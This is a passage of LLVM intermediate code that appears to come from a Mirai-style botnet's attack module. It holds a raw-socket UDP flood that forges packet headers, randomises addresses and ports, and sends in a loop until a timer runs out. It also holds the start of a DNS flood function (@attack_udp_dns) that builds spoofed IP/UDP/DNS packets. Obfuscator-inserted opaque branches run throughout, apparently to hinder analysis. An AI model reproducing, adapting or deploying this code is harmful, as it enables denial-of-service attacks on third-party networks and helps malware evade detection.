  %148 = call zeroext i16 @htons(i16 zeroext %147) #7
  %149 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 2
  store i16 %148, i16* %150, align 2
  %151 = load i16, i16* %15, align 2
  %152 = call zeroext i16 @htons(i16 zeroext %151) #7
  %153 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %154 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %153, i32 0, i32 3
  store i16 %152, i16* %154, align 4
  %155 = load i8, i8* %16, align 1
  %156 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 5
  store i8 %155, i8* %157, align 4
  %158 = load i8, i8* %17, align 1
  %159 = icmp ne i8 %158, 0
  br i1 %159, label %160, label %180

; <label>:160:                                    ; preds = %113
  %161 = load i32, i32* @x.31
  %162 = load i32, i32* @y.32
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %160
  %169 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 4
  store i16 %169, i16* %171, align 2
  %172 = load i32, i32* @x.31
  %173 = load i32, i32* @y.32
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %180

; <label>:180:                                    ; preds = %originalBBpart28, %113
  %181 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 6
  store i8 17, i8* %182, align 1
  %183 = load i32, i32* @LOCAL_ADDR, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 8
  store i32 %183, i32* %185, align 4
  %186 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %187 = load i32, i32* %11, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i32 0, i32 1
  %191 = load i32, i32* %190, align 4
  %192 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 9
  store i32 %191, i32* %193, align 4
  %194 = load i16, i16* %18, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %197 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %196, i32 0, i32 0
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %19, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 1
  store i16 %199, i16* %201, align 2
  %202 = load i32, i32* %21, align 4
  %203 = sext i32 %202 to i64
  %204 = add i64 12, %203
  %205 = trunc i64 %204 to i16
  %206 = call zeroext i16 @htons(i16 zeroext %205) #7
  %207 = load %struct.udphdr*, %struct.udphdr** %24, align 8
  %208 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %207, i32 0, i32 2
  store i16 %206, i16* %208, align 2
  %209 = load i8*, i8** %25, align 8
  %210 = bitcast i8* %209 to i32*
  store i32 -1, i32* %210, align 4
  %211 = load i8*, i8** %25, align 8
  %212 = getelementptr inbounds i8, i8* %211, i64 4
  store i8* %212, i8** %25, align 8
  %213 = load i8*, i8** %25, align 8
  %214 = load i8*, i8** %20, align 8
  %215 = load i32, i32* %21, align 4
  call void @util_memcpy(i8* %213, i8* %214, i32 %215)
  br label %216

; <label>:216:                                    ; preds = %180
  %217 = load i32, i32* %11, align 4
  %218 = add nsw i32 %217, 1
  store i32 %218, i32* %11, align 4
  br label %108

; <label>:219:                                    ; preds = %108
  br label %220

; <label>:220:                                    ; preds = %477, %219
  store i32 0, i32* %11, align 4
  br label %221

; <label>:221:                                    ; preds = %originalBBpart238, %220
  %222 = load i32, i32* @x.31
  %223 = load i32, i32* @y.32
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %221
  %230 = load i32, i32* %11, align 4
  %231 = load i8, i8* %7, align 1
  %232 = zext i8 %231 to i32
  %233 = icmp slt i32 %230, %232
  %234 = load i32, i32* @x.31
  %235 = load i32, i32* @y.32
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %233, label %242, label %439

; <label>:242:                                    ; preds = %originalBBpart212
  %243 = load i8**, i8*** %13, align 8
  %244 = load i32, i32* %11, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds i8*, i8** %243, i64 %245
  %247 = load i8*, i8** %246, align 8
  store i8* %247, i8** %26, align 8
  %248 = load i8*, i8** %26, align 8
  %249 = bitcast i8* %248 to %struct.iphdr*
  store %struct.iphdr* %249, %struct.iphdr** %27, align 8
  %250 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %251 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %250, i64 1
  %252 = bitcast %struct.iphdr* %251 to %struct.udphdr*
  store %struct.udphdr* %252, %struct.udphdr** %28, align 8
  %253 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %254 = load i32, i32* %11, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %253, i64 %255
  %257 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %256, i32 0, i32 2
  %258 = load i8, i8* %257, align 4
  %259 = zext i8 %258 to i32
  %260 = icmp slt i32 %259, 32
  br i1 %260, label %261, label %282

; <label>:261:                                    ; preds = %242
  %262 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %263 = load i32, i32* %11, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %262, i64 %264
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %265, i32 0, i32 1
  %267 = load i32, i32* %266, align 4
  %268 = call i32 @ntohl(i32 %267) #7
  %269 = call i32 @rand_next()
  %270 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %271 = load i32, i32* %11, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %270, i64 %272
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %273, i32 0, i32 2
  %275 = load i8, i8* %274, align 4
  %276 = zext i8 %275 to i32
  %277 = lshr i32 %269, %276
  %278 = add i32 %268, %277
  %279 = call i32 @htonl(i32 %278) #7
  %280 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %281 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %280, i32 0, i32 9
  store i32 %279, i32* %281, align 4
  br label %282

; <label>:282:                                    ; preds = %261, %242
  %283 = load i16, i16* %15, align 2
  %284 = zext i16 %283 to i32
  %285 = icmp eq i32 %284, 65535
  br i1 %285, label %286, label %307

; <label>:286:                                    ; preds = %282
  %287 = load i32, i32* @x.31
  %288 = load i32, i32* @y.32
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %286
  %295 = call i32 @rand_next()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 3
  store i16 %296, i16* %298, align 4
  %299 = load i32, i32* @x.31
  %300 = load i32, i32* @y.32
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %307

; <label>:307:                                    ; preds = %originalBBpart216, %282
  %308 = load i32, i32* @x.31
  %309 = load i32, i32* @y.32
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %307
  %316 = load i16, i16* %18, align 2
  %317 = zext i16 %316 to i32
  %318 = icmp eq i32 %317, 65535
  %319 = load i32, i32* @x.31
  %320 = load i32, i32* @y.32
  %321 = sub i32 %319, 1
  %322 = mul i32 %319, %321
  %323 = urem i32 %322, 2
  %324 = icmp eq i32 %323, 0
  %325 = icmp slt i32 %320, 10
  %326 = or i1 %324, %325
  br i1 %326, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %318, label %327, label %348

; <label>:327:                                    ; preds = %originalBBpart220
  %328 = load i32, i32* @x.31
  %329 = load i32, i32* @y.32
  %330 = sub i32 %328, 1
  %331 = mul i32 %328, %330
  %332 = urem i32 %331, 2
  %333 = icmp eq i32 %332, 0
  %334 = icmp slt i32 %329, 10
  %335 = or i1 %333, %334
  br i1 %335, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %327
  %336 = call i32 @rand_next()
  %337 = trunc i32 %336 to i16
  %338 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i32 0, i32 0
  store i16 %337, i16* %339, align 2
  %340 = load i32, i32* @x.31
  %341 = load i32, i32* @y.32
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %348

; <label>:348:                                    ; preds = %originalBBpart224, %originalBBpart220
  %349 = load i16, i16* %19, align 2
  %350 = zext i16 %349 to i32
  %351 = icmp eq i32 %350, 65535
  br i1 %351, label %352, label %373

; <label>:352:                                    ; preds = %348
  %353 = load i32, i32* @x.31
  %354 = load i32, i32* @y.32
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %352
  %361 = call i32 @rand_next()
  %362 = trunc i32 %361 to i16
  %363 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %364 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %363, i32 0, i32 1
  store i16 %362, i16* %364, align 2
  %365 = load i32, i32* @x.31
  %366 = load i32, i32* @y.32
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %373

; <label>:373:                                    ; preds = %originalBBpart228, %348
  %374 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %375 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %374, i32 0, i32 7
  store i16 0, i16* %375, align 2
  %376 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %377 = bitcast %struct.iphdr* %376 to i16*
  %378 = call zeroext i16 @checksum_generic(i16* %377, i32 20)
  %379 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 7
  store i16 %378, i16* %380, align 2
  %381 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %382 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %381, i32 0, i32 3
  store i16 0, i16* %382, align 2
  %383 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %384 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %385 = bitcast %struct.udphdr* %384 to i8*
  %386 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %387 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %386, i32 0, i32 2
  %388 = load i16, i16* %387, align 2
  %389 = load i32, i32* %21, align 4
  %390 = sext i32 %389 to i64
  %391 = add i64 12, %390
  %392 = trunc i64 %391 to i32
  %393 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %383, i8* %385, i16 zeroext %388, i32 %392)
  %394 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %395 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %394, i32 0, i32 3
  store i16 %393, i16* %395, align 2
  %396 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %397 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %396, i32 0, i32 1
  %398 = load i16, i16* %397, align 2
  %399 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %400 = load i32, i32* %11, align 4
  %401 = sext i32 %400 to i64
  %402 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %399, i64 %401
  %403 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %402, i32 0, i32 0
  %404 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %403, i32 0, i32 1
  store i16 %398, i16* %404, align 2
  %405 = load i32, i32* %12, align 4
  %406 = load i8*, i8** %26, align 8
  %407 = load i32, i32* %21, align 4
  %408 = sext i32 %407 to i64
  %409 = add i64 32, %408
  %410 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %411 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %412 = load i32, i32* %11, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %411, i64 %413
  %415 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i32 0, i32 0
  %416 = bitcast %struct.sockaddr_in* %415 to %struct.sockaddr*
  store %struct.sockaddr* %416, %struct.sockaddr** %410, align 8
  %417 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %418 = load %struct.sockaddr*, %struct.sockaddr** %417, align 8
  %419 = call i64 @sendto(i32 %405, i8* %406, i64 %409, i32 16384, %struct.sockaddr* %418, i32 16)
  br label %420

; <label>:420:                                    ; preds = %373
  %421 = load i32, i32* @x.31
  %422 = load i32, i32* @y.32
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %420
  %429 = load i32, i32* %11, align 4
  %430 = add nsw i32 %429, 1
  store i32 %430, i32* %11, align 4
  %431 = load i32, i32* @x.31
  %432 = load i32, i32* @y.32
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBBpart238, label %originalBB30alteredBB

originalBBpart238:                                ; preds = %originalBB30
  br label %221

; <label>:439:                                    ; preds = %originalBBpart212
  %440 = load i32, i32* @x.31
  %441 = load i32, i32* @y.32
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %439
  %448 = call i64 @time(i64* null) #6
  %449 = load i32, i32* %22, align 4
  %450 = sext i32 %449 to i64
  %451 = icmp sgt i64 %448, %450
  %452 = load i32, i32* @x.31
  %453 = load i32, i32* @y.32
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %451, label %460, label %477

; <label>:460:                                    ; preds = %originalBBpart242
  %461 = load i32, i32* @x.31
  %462 = load i32, i32* @y.32
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %460
  %469 = load i32, i32* @x.31
  %470 = load i32, i32* @y.32
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %478

; <label>:477:                                    ; preds = %originalBBpart242
  br label %220

; <label>:478:                                    ; preds = %originalBBpart246, %originalBBpart2, %66
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %72
  %479 = load i32, i32* %12, align 4
  %480 = call i32 @close(i32 %479)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %91
  store i32 0, i32* %11, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %160
  %481 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %482 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %483 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %482, i32 0, i32 4
  store i16 %481, i16* %483, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %221
  %484 = load i32, i32* %11, align 4
  %485 = load i8, i8* %7, align 1
  %486 = zext i8 %485 to i32
  %487 = icmp slt i32 %484, %486
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %286
  %488 = call i32 @rand_next()
  %489 = trunc i32 %488 to i16
  %490 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i32 0, i32 3
  store i16 %489, i16* %491, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %307
  %492 = load i16, i16* %18, align 2
  %493 = zext i16 %492 to i32
  %494 = icmp eq i32 %493, 65535
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %327
  %495 = call i32 @rand_next()
  %496 = trunc i32 %495 to i16
  %497 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %498 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %497, i32 0, i32 0
  store i16 %496, i16* %498, align 2
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %352
  %499 = call i32 @rand_next()
  %500 = trunc i32 %499 to i16
  %501 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %502 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %501, i32 0, i32 1
  store i16 %500, i16* %502, align 2
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %420
  %503 = load i32, i32* %11, align 4
  %_ = shl i32 %503, 1
  %_31 = shl i32 %503, 1
  %_32 = shl i32 %503, 1
  %_33 = sub i32 %503, 1
  %gen = mul i32 %_33, 1
  %_34 = shl i32 %503, 1
  %_35 = shl i32 %503, 1
  %_36 = shl i32 %503, 1
  %504 = add nsw i32 %503, 1
  store i32 %504, i32* %11, align 4
  br label %originalBB30

originalBB40alteredBB:                            ; preds = %originalBB40, %439
  %505 = call i64 @time(i64* null) #6
  %506 = load i32, i32* %22, align 4
  %507 = sext i32 %506 to i64
  %508 = icmp sgt i64 %505, %507
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %460
  br label %originalBB44
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca %struct.dnshdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i8*, align 8
  %34 = alloca %struct.grehdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.udphdr*, align 8
  %38 = alloca %struct.dnshdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %41 = load i8, i8* %7, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %13, align 8
  %45 = load i8, i8* %9, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %9, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %15, align 2
  %53 = load i8, i8* %9, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %16, align 1
  %57 = load i8, i8* %9, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 0)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %17, align 1
  %61 = load i8, i8* %9, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %18, align 2
  %65 = load i8, i8* %9, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 53)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %19, align 2
  %69 = load i8, i8* %9, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 9, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %20, align 2
  %73 = load i8, i8* %9, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 0, i32 12)
  %76 = trunc i32 %75 to i8
  store i8 %76, i8* %21, align 1
  %77 = load i8, i8* %9, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %79 = call i8* @attack_get_opt_str(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 8, i8* null)
  store i8* %79, i8** %22, align 8
  store i32 0, i32* %23, align 4
  %80 = call i32 @get_dns_resolver()
  store i32 %80, i32* %24, align 4
  %81 = call i64 @time(i64* null) #6
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = add nsw i64 %81, %83
  %85 = trunc i64 %84 to i32
  store i32 %85, i32* %25, align 4
  %86 = load i8*, i8** %22, align 8
  %87 = icmp eq i8* %86, null
  br i1 %87, label %88, label %105

; <label>:88:                                     ; preds = %5
  %89 = load i32, i32* @x.33
  %90 = load i32, i32* @y.34
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %88
  %97 = load i32, i32* @x.33
  %98 = load i32, i32* @y.34
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %574

; <label>:105:                                    ; preds = %5
  %106 = load i8*, i8** %22, align 8
  %107 = call i32 @util_strlen(i8* %106)
  store i32 %107, i32* %23, align 4
  %108 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %108, i32* %12, align 4
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %111

; <label>:110:                                    ; preds = %105
  br label %574

; <label>:111:                                    ; preds = %105
  store i32 1, i32* %11, align 4
  %112 = load i32, i32* %12, align 4
  %113 = bitcast i32* %11 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #6
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* %12, align 4
  %118 = call i32 @close(i32 %117)
  br label %574

; <label>:119:                                    ; preds = %111
  store i32 0, i32* %11, align 4
  br label %120

; <label>:120:                                    ; preds = %originalBBpart256, %119
  %121 = load i32, i32* %11, align 4
  %122 = load i8, i8* %7, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %121, %123
  br i1 %124, label %125, label %348

; <label>:125:                                    ; preds = %120
  store i32 0, i32* %26, align 4
  store i8 0, i8* %27, align 1
  store i8 0, i8* %28, align 1
  %126 = call noalias i8* @calloc(i64 600, i64 1) #6
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  store i8* %126, i8** %130, align 8
  %131 = load i8**, i8*** %13, align 8
  %132 = load i32, i32* %11, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  store %struct.iphdr* %136, %struct.iphdr** %29, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i64 1
  %139 = bitcast %struct.iphdr* %138 to %struct.udphdr*
  store %struct.udphdr* %139, %struct.udphdr** %30, align 8
  %140 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %141 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %140, i64 1
  %142 = bitcast %struct.udphdr* %141 to %struct.dnshdr*
  store %struct.dnshdr* %142, %struct.dnshdr** %31, align 8
  %143 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %144 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %143, i64 1
  %145 = bitcast %struct.dnshdr* %144 to i8*
  store i8* %145, i8** %32, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = load i8, i8* %147, align 4
